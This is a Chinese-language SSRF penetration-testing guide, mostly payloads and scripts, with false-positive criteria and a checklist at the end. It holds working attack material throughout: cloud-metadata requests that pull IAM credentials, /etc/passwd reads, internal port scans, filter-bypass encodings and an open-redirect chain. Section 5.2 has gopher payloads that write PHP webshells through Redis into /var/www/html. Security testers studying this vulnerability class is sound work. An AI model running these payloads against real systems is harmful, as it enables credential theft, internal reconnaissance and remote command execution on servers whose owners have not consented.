# SSRF安全测试

## 1. 概述

SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者利用服务器端发起恶意请求的攻击。

**危险等级**: 高

## 2. 测试点识别

### 2.1 常见SSRF点

| 功能 | 示例 |
|------|------|
| URL获取 | `url`, `src`, `href`, `file`, `path` |
| 文件读取 | `file://`, `path=` |
| API调用 | `api_url`, `endpoint`, `fetch_url` |
| 预览 | `preview_url`, `thumbnail` |
| Webhook | `webhook_url`, `callback_url` |
| SSO | `saml_url`, `oauth_url` |

### 2.2 危险关键词

```
url, link, src, href, path, uri, 
file, page, name, doc, template,
view, ajax, jsonp, callback,
content, data, q, search, qid,
proxy, image, img, fetch, goto,
readfile, readtext, include,
load, import, parse, render
```

## 3. SSRF测试Payload

### 3.1 本地地址

```bash
# localhost
http://127.0.0.1
http://localhost
http://[::1]

# 内网IP
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# 加载文件
file:///etc/passwd
file:///c:/windows/win.ini
```

### 3.2 云元数据

```bash
# AWS元数据
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/api/token

# GCP元数据
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname

# Azure元数据
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 3.3 协议测试

```bash
# Dict协议
dict://127.0.0.1:6379/info

# FTP协议
ftp://127.0.0.1:21

# SFTP协议
sftp://127.0.0.1:22

# TFTP协议
tftp://127.0.0.1:69/test

# LDAP协议
ldap://127.0.0.1:389/<GUID>

# SMTP协议
mailto:user@localhost

# Gopher协议
gopher://127.0.0.1:6379/_INFO
```

### 3.4 URL跳转绕过

```bash
# @符绕过
http://example.com@127.0.0.1
http://example.com@localhost

# 端口绕过
http://127.0.0.1:22
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080

# 编码绕过
http://127.0.0.1/%2e%2e/backend
http://127.0.0.1/%252e%252e/backend
http://127.0.0.1.%09.example.com
```

## 4. SSRF curl测试脚本

### 4.1 基础SSRF测试

```bash
#!/bin/bash
# SSRF基础测试脚本

TARGET="http://api/fetch"

echo "=== SSRF测试 ==="

# 测试URL参数
URLS=(
    "http://127.0.0.1"
    "http://localhost"
    "http://169.254.169.254/latest/meta-data/"
    "http://[::1]"
    "file:///etc/passwd"
)

for URL in "${URLS[@]}"; do
    echo "[测试] $URL"
    RESP=$(curl -s -m 5 "$TARGET?url=$URL")
    
    if echo "$RESP" | grep -qiE "root:|admin:|amazon|aws|google|metadata"; then
        echo "  → [疑似漏洞] 获取到内部信息"
        echo "  响应片段: ${RESP:0:200}"
    elif [ ${#RESP} -gt 100 ]; then
        echo "  → [疑似漏洞] 响应长度异常: ${#RESP}"
    else
        echo "  → [无响应或被拦截]"
    fi
    echo ""
done
```

### 4.2 云元数据测试

```bash
#!/bin/bash
# 云元数据SSRF测试

TARGET="http://api/fetch"
HOSTS=(
    "169.254.169.254"
    "metadata.google.internal"
)

echo "=== 云元数据SSRF测试 ==="

for HOST in "${HOSTS[@]}"; do
    echo "[测试] $HOST"
    
    # 获取实例ID
    RESP1=$(curl -s -m 5 "http://${HOST}/latest/meta-data/instance-id")
    echo "  Instance ID: $RESP1"
    
    # 获取用户数据
    RESP2=$(curl -s -m 5 "http://${HOST}/latest/user-data/")
    if [ ${#RESP2} -gt 10 ]; then
        echo "  User Data: ${RESP2:0:100}..."
    fi
    
    # 获取凭证
    RESP3=$(curl -s -m 5 "http://${HOST}/latest/meta-data/iam/security-credentials/")
    if [ ${#RESP3} -gt 10 ]; then
        echo "  Credentials: ${RESP3}"
    fi
    echo ""
done
```

### 4.3 协议测试

```bash
#!/bin/bash
# SSRF协议测试

TARGET="http://api/fetch"

echo "=== SSRF协议测试 ==="

# Dict协议 - Redis
RESP1=$(curl -s -m 5 "$TARGET?url=dict://127.0.0.1:6379/info")
echo "[Dict] Redis: $RESP1"

# FTP协议
RESP2=$(curl -s -m 5 "$TARGET?url=ftp://127.0.0.1/")
echo "[FTP] Response length: ${#RESP2}"

# Gopher协议 - Redis
RESP3=$(curl -s -m 5 "$TARGET?url=gopher://127.0.0.1:6379/_INFO")
echo "[Gopher] Redis: ${RESP3:0:100}"
```

## 5. SSRF利用链

### 5.1 内网端口探测

```bash
# 利用SSRF探测内网端口
for port in 22 80 443 3306 6379 8080 8443; do
    RESP=$(curl -s -m 3 "$TARGET?url=http://127.0.0.1:$port")
    if [ $? -eq 0 ]; then
        echo "[开放] 端口 $port"
    fi
done
```

### 5.2 Redis利用

```bash
# 通过SSRF写入Redis
# 构造Gopher payload
URL="gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%0D%0A%0D%0ASAVE%0D%0Aquit"
curl -s "$TARGET?url=$URL"

# 写入WebShell
URL="gopher://127.0.0.1:6379/_SET%20file%20%22%3C%3Fphp%20%40eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%22%0D%0Aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0Aconfig%20set%20dbfilename%20shell.php%0D%0Asave"
curl -s "$TARGET?url=$URL"
```

### 5.3 MySQL利用

```bash
# 通过SSRF连接MySQL
URL="mysql://127.0.0.1:3306/?sql=SELECT%20*%20FROM%20users"
curl -s "$TARGET?url=$URL"
```

### 5.4 利用链脚本

```python
import requests
import urllib.parse

class SSRFExploiter:
    def __init__(self, target):
        self.target = target
        
    def test_basic(self, param="url"):
        """基础SSRF测试"""
        payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd"
        ]
        
        for payload in payloads:
            resp = requests.get(
                f"{self.target}?{param}={payload}",
                timeout=10
            )
            if len(resp.text) > 50:
                print(f"[疑似] {payload}: {resp.text[:100]}")
    
    def test_cloud_metadata(self):
        """云元数据测试"""
        targets = [
            ("AWS", "http://169.254.169.254/latest/meta-data/"),
            ("AWS Token", "http://169.254.169.254/latest/api/token"),
            ("GCP", "http://metadata.google.internal/computeMetadata/v1/"),
            ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ]
        
        for name, url in targets:
            try:
                resp = requests.get(url, timeout=5)
                if resp.status_code == 200:
                    print(f"[{name}] 元数据可访问: {resp.text[:200]}")
            except:
                pass
    
    def test_port_scan(self, ports=[22, 80, 443, 3306, 6379, 8080]):
        """内网端口扫描"""
        print("\n=== 端口扫描 ===")
        for port in ports:
            try:
                resp = requests.get(
                    f"{self.target}?url=http://127.0.0.1:{port}",
                    timeout=3
                )
                print(f"[开放] 端口 {port}")
            except requests.exceptions.RequestException:
                pass
```

## 6. SSRF绕过技巧

### 6.1 IP地址绕过

```bash
# 转换形式
127.0.0.1 → 2130706433 (十进制)
127.0.0.1 → 0x7f000001 (十六进制)
127.0.0.1 → 017700000001 (八进制)
127.0.0.1 → 127.1 (简化)
localhost → localhost.attacker.com
```

### 6.2 URL绕过

```bash
# @符
http://example.com@127.0.0.1

# 端口
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080

# 编码
http://127.0.0.1/%2e%2e/backend
http://127.0.0.1%09.example.com

# 协议变体
dict://127.0.0.1:6379
ftp://127.0.0.1
gopher://127.0.0.1:6379
```

### 6.3 重定向绕过

```bash
# 利用开放重定向
# 1. 先找目标站点的开放重定向
http://target.com/redirect?url=http://evil.com

# 2. SSRF目标站点指向开放重定向
http://api/fetch?url=http://target.com/redirect?url=http://169.254.169.254
```

## 7. SSRF误报判断标准

### 7.1 核心判断原则

```
【重要】SSRF测试需要确认"是否真的发起请求"

判断逻辑：
1. 请求是否成功发出
2. 响应是否包含内部信息
3. 是否能探测内网服务

【真实漏洞特征】
- 返回了内网服务响应
- 获取到了云凭证
- 能够读取本地文件
- 能够探测内网端口

【误报特征】
- 请求被拦截/超时
- 响应只是错误信息
- 没有返回内部信息
```

### 7.2 判断矩阵

| 场景 | 响应内容 | 判断 |
|------|----------|------|
| 本地地址 | 返回localhost内容 | ⚠️ 漏洞 |
| 云元数据 | 返回实例ID/凭证 | ⚠️ 严重漏洞 |
| 内网端口 | 端口开放 | ⚠️ 漏洞 |
| 文件读取 | 返回passwd内容 | ⚠️ 严重漏洞 |
| 超时/无响应 | 无 | ❌ 可能安全 |
| 错误信息 | 403/拦截 | ❌ 有防护 |

## 8. 测试检查清单

```
□ 识别SSRF参数点
□ 测试本地地址访问
□ 测试云元数据访问
□ 测试内网端口探测
□ 测试协议利用(dict/gopher/ftp)
□ 测试文件读取
□ 测试IP/URL绕过
□ 测试利用链(Redis/MySQL)
□ 评估漏洞影响
```
